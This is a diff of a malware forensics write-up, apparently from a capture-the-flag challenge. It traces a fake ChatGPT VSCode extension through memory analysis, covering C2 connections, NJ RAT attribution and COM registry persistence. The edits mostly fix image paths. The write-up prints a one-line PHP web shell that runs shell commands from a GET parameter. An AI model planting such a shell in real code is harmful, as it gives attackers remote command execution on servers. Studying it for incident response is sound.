@@ -99,7 +99,7 @@ To understand the full scope of the attack, I examined active network connection
 python vol.py -f memdump.dmp windows.netstat
 ```
 
-![runtimebroker TCP connection](images/ReliableThreat-netstat.png)
+![runtimebroker TCP connection](../images/ReliableThreat-netstat.png)
 
 This revealed that RuntimeBroker.exe had an active connection to `18.197.239.5:18854` at the time of memory capture. This represents a **second C2 channel** beyond the ngrok tunnel found in the VSCode extension, indicating a sophisticated multi-stage attack:
 
@@ -108,7 +108,7 @@ This revealed that RuntimeBroker.exe had an active connection to `18.197.239.5:1
 
 After running this IP through an IP abuse database, I found that this is associated with the NJ RAT malware.
 
-![abuseIPdb screenshot](images/ReliableThreat-ipabusedb.png)
+![abuseIPdb screenshot](../images/ReliableThreat-ipabusedb.png)
 
 https://www.abuseipdb.com/check/18.197.239.5
 
@@ -218,7 +218,7 @@ This UTF-8 encoding flag solved the Unicode issues and let me proceed with the a
 
 Since the malicious activity was contained within the code.exe process rather than spawning obvious child processes, I had to dig deeper into what VSCode was actually loading and executing. Looking at my process analysis, I found multiple Code.exe processes running (PIDs: 1fac, 10b0, 1dd4, 1e78, 1ebc, etc.), which made it challenging to identify which one was compromised.
 
-![Process Tree](images/ReliableThreat-pstree-for-codeexe.png)
+![Process Tree](../images/ReliableThreat-pstree-for-codeexe.png)
 
 _Process tree showing multiple Code.exe processes with extension infrastructure active. Note the absence of obvious malicious child processes - the attack was hidden within VSCode's legitimate process space, making detection much more challenging._
 
@@ -247,9 +247,6 @@ Then I searched through all the extensions. Looking through the massive list of 
 - **Version:** `0.0.1` (brand new, completely untested)
 - **Stood out:** Among all the legitimate, professional extensions, this one looked completely out of place
 
-![VSCode Extension Discovery](images/ReliableThreat-pstree-for-codeexe.png)
-
-_Screenshot showing the suspicious ChatGPT extension discovered among legitimate VSCode extensions in memory - the clear anomaly that led to the breakthrough._
 
 This was clearly the **patient zero** of the attack - a **social engineering attack** using a fake AI productivity extension to compromise developer tools.
 
@@ -295,7 +292,7 @@ To find the port number, I:
 3. Used **Windows Programmer Calculator** to solve the hex equation
 4. **Result: Port 16587**
 
-![Obfuscated Code](images/ReliableThreat-Obfuscated-code.png)
+![Obfuscated Code](../images/ReliableThreat-Obfuscated-code.png)
 
 _Obfuscated JavaScript code showing the network connection setup - demonstrating the deobfuscation challenge faced during analysis._
 
@@ -311,11 +308,11 @@ python vol.py -f memdump.dmp windows.dumpfiles --virtaddr [package.json address]
 
 **Key finding:** The `publisher` and `publisherDisplayName` were slightly different, suggesting the threat actor might be trying to impersonate a legitimate developer.
 
-![Package.json Attribution](images/ReliableThreat-threat-actor-pub-display.png)
+![Package.json Attribution](../images/ReliableThreat-threat-actor-pub-display.png)
 
 _Package.json metadata showing threat actor attribution data - publisher details that helped identify the malicious actor behind the supply chain attack._
 
-![Package.json Attribution](images/ReliableThreat-threat-actor-metadata.png)
+![Package.json Attribution](../images/ReliableThreat-threat-actor-metadata.png)
 
 ### Timeline Analysis
 
@@ -349,7 +346,7 @@ The VirusTotal analysis showed that this malware alters the registry key of the 
 
 Through the VirusTotal analysis of `temp.exe`, I discovered the registry modification technique. The malware modifies the registry key of the COM component with CLSID {645FF040-5081-101B-9F08-00AA002F954E}.
 
-![VirusTotal Analysis](images/ReliableThreat-tempexe-virustotal.png)
+![VirusTotal Analysis](../images/ReliableThreat-tempexe-virustotal.png)
 
 _VirusTotal analysis results showing temp.exe as malware and revealing the registry modification technique used for persistence._
 
@@ -371,7 +368,7 @@ The threat actor also modified a project file for additional persistence. In the
 $testc = $_GET['s1']; echo `$testc`;
 ```
 
-![index.php File changed for additional persistence](images/ReliableThreat-webshell-indexphp.png)
+![index.php File changed for additional persistence](../images/ReliableThreat-webshell-indexphp.png)
 
 This creates a web shell allowing remote command execution via the `s1` parameter.
 
